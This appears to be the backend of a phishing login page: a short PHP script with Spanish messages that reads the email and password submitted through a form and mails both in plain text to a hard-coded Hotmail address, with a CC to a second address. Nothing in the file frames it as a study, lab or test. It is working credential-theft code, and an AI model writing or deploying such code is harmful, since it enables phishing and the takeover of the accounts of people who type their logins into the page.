<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    // Enviar el correo con los datos
    $to = "portadordelhiphop@hotmail.com";
    $subject = "Datos de inicio de sesión";
    $message = "Correo electrónico: " . $email . "\nContraseña: " . $password;
    $headers = "From: webmaster@example.com" . "\r\n" .
               "CC: another@example.com";
    
    if (mail($to, $subject, $message, $headers)) {
        echo "Los datos de inicio de sesión han sido enviados correctamente.";
    } else {
        echo "Error al enviar los datos de inicio de sesión.";
    }
}
?>
